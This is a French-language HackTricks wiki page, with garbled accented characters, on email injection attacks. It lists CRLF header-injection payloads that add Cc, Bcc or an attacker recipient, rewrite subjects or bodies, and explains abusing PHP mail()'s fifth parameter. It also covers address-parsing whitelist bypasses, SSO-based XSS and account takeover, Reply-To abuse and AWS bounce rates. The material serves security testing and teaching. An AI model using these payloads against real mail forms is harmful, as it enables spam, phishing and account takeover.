# Injections par e-mail

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui √† :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Injecter dans l'e-mail envoy√©

### Injecter Cc et Bcc apr√®s l'argument de l'exp√©diteur
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Le message sera envoy√© aux comptes destinataire et destinataire1.

### Injecter l'argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
### Injecter l'argument Sujet

Le message sera envoy√© au destinataire d'origine et au compte de l'attaquant.
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### Changer le corps du message

Injectez un saut de ligne √† deux lignes, puis √©crivez votre message pour changer le corps du message.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Exploitation de la fonction mail() PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Le 5√®me param√®tre ($additional\_parameters)

Cette section va se baser sur **comment abuser de ce param√®tre en supposant qu'un attaquant le contr√¥le**.

Ce param√®tre va √™tre ajout√© √† la ligne de commande que PHP va utiliser pour invoquer le binaire sendmail. Cependant, il sera d√©sinfect√© avec la fonction `escapeshellcmd($additional_parameters)`.

Un attaquant peut **injecter des param√®tres suppl√©mentaires pour sendmail** dans ce cas.

#### Diff√©rences dans l'impl√©mentation de /usr/sbin/sendmail

L'interface **sendmail** est **fournie par le logiciel de messagerie MTA** (Sendmail, Postfix, Exim etc.) install√© sur le syst√®me. Bien que la **fonctionnalit√© de base** (comme les param√®tres -t -i -f) reste la **m√™me** pour des raisons de compatibilit√©, **d'autres fonctions et param√®tres** varient grandement en fonction du MTA install√©.

Voici quelques exemples de diff√©rentes pages de manuel de la commande/interface sendmail :

* Sendmail MTA : http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA : http://www.postfix.org/mailq.1.html
* Exim MTA : https://linux.die.net/man/8/eximReferences

Selon l'**origine du binaire sendmail**, diff√©rentes options ont √©t√© d√©couvertes pour les abuser et **exfiltrer des fichiers ou m√™me ex√©cuter des commandes arbitraires**. V√©rifiez comment sur [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injection dans le nom de l'e-mail

### Parties ignor√©es d'un e-mail

Les symboles : **+, -** et **{}** dans de rares occasions peuvent √™tre utilis√©s pour marquer et √™tre ignor√©s par la plupart des serveurs de messagerie

* Par exemple, john.doe+intigriti@example.com ‚Üí john.doe@example.com

Les **commentaires entre parenth√®ses ()** au d√©but ou √† la fin seront √©galement ignor√©s

* Par exemple, john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Contournement de la liste blanche

<figure><img src="../.gitbook/assets/image (4) (6).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Guillemets

<figure><img src="../.gitbook/assets/image (6) (4).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Vous pouvez √©galement utiliser des IPs comme nom de domaine entre crochets :

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Autres vuln√©rabilit√©s

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../.gitbook/assets/image (296).png>)

## SSO de tiers

### XSS

Certains services comme **github** ou **salesforce permettent** de cr√©er une **adresse e-mail avec des charges XSS**. Si vous pouvez **utiliser ces fournisseurs pour vous connecter √† d'autres services** et que ces services ne **d√©sinfectent pas correctement** l'e-mail, vous pourriez causer **XSS**.

### Prise de contr√¥le de compte

Si un **service SSO** vous permet de **cr√©er un compte sans v√©rifier l'adresse e-mail fournie** (comme **salesforce**) et que vous pouvez ensuite utiliser ce compte pour **vous connecter √† un service diff√©rent** qui **fait confiance** √† salesforce, vous pourriez acc√©der √† n'importe quel compte.\
_Notez que salesforce indique si l'e-mail fourni a √©t√© v√©rifi√© ou non, donc l'application devrait prendre en compte cette information._

## R√©pondre √†

Vous pouvez envoyer un e-mail en utilisant _**De : entreprise.com**_ et _**R√©pondre √† : attaquant.com**_ et si une **r√©ponse automatique** est envoy√©e car l'e-mail a √©t√© envoy√© **depuis** une **adresse interne**, l'**attaquant** pourrait √™tre en mesure de **recevoir** cette **r√©ponse**.

## Taux de rebond dur

Certains services, comme AWS, mettent en place un seuil connu sous le nom de **Taux de Rebond Dur**, g√©n√©ralement fix√© √† 10%. Il s'agit d'une m√©trique critique, notamment pour les services de livraison d'e-mails. Lorsque ce taux est d√©pass√©, le service, tel que le service e-mail d'AWS, peut √™tre suspendu ou bloqu√©.

Un **rebond dur** fait r√©f√©rence √† un **e-mail** qui a √©t√© renvoy√© √† l'exp√©diteur car l'adresse du destinataire est invalide ou n'existe pas. Cela pourrait se produire pour diverses raisons, telles que l'envoi de l'e-mail √† une adresse inexistante, un domaine qui n'est pas r√©el, ou le refus du serveur du destinataire d'accepter des **e-mails**.

Dans le contexte d'AWS, si vous envoyez 1000 e-mails et que 100 d'entre eux entra√Ænent des rebonds durs (pour des raisons telles que des adresses ou des domaines invalides), cela signifierait un taux de rebond dur de 10%. Atteindre ou d√©passer ce taux peut d√©clencher le blocage ou la suspension par AWS SES (Simple Email Service) de vos capacit√©s d'envoi d'e-mails.

Il est crucial de maintenir un faible taux de rebond dur pour garantir un service e-mail ininterrompu et maintenir la r√©putation de l'exp√©diteur. La surveillance et la gestion de la qualit√© des adresses e-mail dans vos listes de diffusion peuvent grandement aider √† atteindre cet objectif.

Pour des informations plus d√©taill√©es, la documentation officielle d'AWS sur la gestion des rebonds et des plaintes peut √™tre consult√©e sur [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## R√©f√©rences

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [groupe telegram](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
